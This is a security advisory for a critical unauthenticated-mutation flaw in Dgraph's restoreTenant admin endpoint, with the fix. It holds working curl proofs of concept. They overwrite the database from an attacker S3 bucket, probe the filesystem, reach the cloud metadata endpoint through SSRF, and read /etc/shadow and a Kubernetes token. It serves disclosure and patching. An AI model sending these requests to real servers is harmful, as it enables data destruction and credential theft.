# [C] Dgraph: Pre-Auth Database Overwrite + SSRF + File Read via restoreTenant Missing Authorization

## Summary
Severity: Critical
Advisory: GHSA-p5rh-vmhp-gvcw
CVE: CVE-2026-34976
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-02
Source: https://github.com/advisories/GHSA-p5rh-vmhp-gvcw
Type: github-advisory

## Affected
- Go: `github.com/dgraph-io/dgraph/v25` — affected >=0 <25.3.1
- Go: `github.com/dgraph-io/dgraph/v24` — affected >=0
- Go: `github.com/dgraph-io/dgraph` — affected >=0

## Details
The `restoreTenant` admin mutation is missing from the authorization middleware config (`admin.go:499-522`), making it completely unauthenticated. Unlike the similar `restore` mutation which requires Guardian-of-Galaxy authentication, `restoreTenant` executes with zero middleware.

This mutation accepts attacker-controlled backup source URLs (including `file://` for local filesystem access), S3/MinIO credentials, encryption key file paths, and Vault credential file paths. An unauthenticated attacker can overwrite the entire database, read server-side files, and perform SSRF.

## Authentication Bypass

Every admin mutation has middleware configured in `adminMutationMWConfig` (`admin.go:499-522`) EXCEPT `restoreTenant`. The `restore` mutation has `gogMutMWs` (Guardian of Galaxy auth + IP whitelist + logging). `restoreTenant` is absent from the map.

When middleware is looked up at `resolve/resolver.go:431`, the map returns nil. The `Then()` method at `resolve/middlewares.go:98` checks `len(mws) == 0` and returns the resolver directly, skipping all authentication, authorization, IP whitelisting, and audit logging.

## PoC 1: Pre-Auth Database Overwrite

The attacker hosts a crafted Dgraph backup on their own S3 bucket, then triggers a restore that overwrites the target namespace's entire database:

    # No authentication headers needed. No X-Dgraph-AuthToken, no JWT, no Guardian credentials.
    curl -X POST http://dgraph-alpha:8080/admin \
      -H "Content-Type: application/json" \
      -d '{
        "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/evil-backup\", accessKey: \"AKIAIOSFODNN7EXAMPLE\", secretKey: \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\", anonymous: false }, fromNamespace: 0 }) { code message } }"
      }'

    # Response: {"data":{"restoreTenant":{"code":"Success","message":"Restore operation started."}}}
    # The server fetches the attacker's backup from S3 and overwrites namespace 0 (root namespace).

The resolver at `admin/restore.go:54-74` passes `location`, `accessKey`, `secretKey` directly to `worker.ProcessRestoreRequest`. The worker at `online_restore.go:98-106` connects to the attacker's S3 bucket and restores the malicious backup, overwriting all data.

Note: the `anonymous: true` flag (`minioclient.go:108-113`) creates an S3 client with NO credentials, allowing the attacker to host the malicious backup on a **public S3 bucket** without providing any AWS keys:

    mutation { restoreTenant(input: {
      restoreInput: { location: "s3://public-attacker-bucket/evil-backup", anonymous: true },
      fromNamespace: 0
    }) { code message } }

## Live PoC Results (Dgraph v24.x Docker)

Tested against `dgraph/dgraph:latest` in Docker. Side-by-side comparison:

    # restore (HAS middleware) -> BLOCKED
    $ curl ... '{"query": "mutation { restore(...) { code } }"}'
    {"errors":[{"message":"resolving restore failed because unauthorized ip address: 172.25.0.1"}]}

    # restoreTenant (MISSING middleware) -> AUTH BYPASSED
    $ curl ... '{"query": "mutation { restoreTenant(...) { code } }"}'
    {"errors":[{"message":"resolving restoreTenant failed because failed to verify backup: No backups with the specified backup ID"}]}

The `restore` mutation is blocked by the IP whitelist middleware. The `restoreTenant` mutation bypasses all middleware and reaches the backup verification logic.

Filesystem enumeration also confirmed with distinct error messages:
- `/etc/` (exists): "No backups with the specified backup ID" (directory scanned)
- `/nonexistent/` (doesn't exist): "The uri path doesn't exists" (path doesn't exist)
- `/tmp/` (exists, empty): "No backups with the specified backup ID" (directory scanned)

## PoC 2: Local Filesystem Probe via file:// Scheme

    curl -X POST http://dgraph-alpha:8080/admin \
      -H "Content-Type: application/json" \
      -d '{
        "query": "mutation { restoreTenant(input: { restoreInput: { location: \"file:///etc/\" }, fromNamespace: 0 }) { code message } }"
      }'

    # Error response reveals whether /etc/ exists and its structure.
    # backup_handler.go:130-132 creates a fileHandler for file:// URIs.
    # fileHandler.ListPaths at line 161-166 walks the local filesystem.
    # fileHandler.Read at line 153 reads files: os.ReadFile(h.JoinPath(path))

## PoC 3: SSRF via S3 Endpoint

    curl -X POST http://dgraph-alpha:8080/admin \
      -H "Content-Type: application/json" \
      -d '{
        "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://169.254.169.254/latest/meta-data/\" }, fromNamespace: 0 }) { code message } }"
      }'

    # The Minio client at backup_handler.go:257 connects to 169.254.169.254 as an S3 endpoint.
    # Error response may leak cloud metadata information.

## PoC 4: Vault SSRF + Server File Path Read

    curl -X POST http://dgraph-alpha:8080/admin \
      -H "Content-Type: application/json" \
      -d '{
        "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/backup\", accessKey: \"AKIA...\", secretKey: \"...\", vaultAddr: \"http://internal-service:8080\", vaultRoleIDFile: \"/var/run/secrets/kubernetes.io/serviceaccount/token\", vaultSecretIDFile: \"/etc/passwd\", encryptionKeyFile: \"/etc/shadow\" }, fromNamespace: 0 }) { code message } }"
      }'

    # vaultAddr at online_restore.go:484 triggers SSRF to internal-service:8080
    # vaultRoleIDFile at online_restore.go:478-479 reads the K8s SA token from disk
    # encryptionKeyFile at online_restore.go:475 reads /etc/shadow via BuildEncFlag

## Fix

Add `restoreTenant` to `adminMutationMWConfig`:

    "restoreTenant": gogMutMWs,

Koda Reef

## References
- https://github.com/dgraph-io/dgraph/security/advisories/GHSA-p5rh-vmhp-gvcw
- https://nvd.nist.gov/vuln/detail/CVE-2026-34976
- https://github.com/dgraph-io/dgraph/commit/b15c87e9353e36618bf8e0df3bd945c0ce7105ef
- https://github.com/dgraph-io/dgraph
- https://github.com/dgraph-io/dgraph/releases/tag/v25.3.1
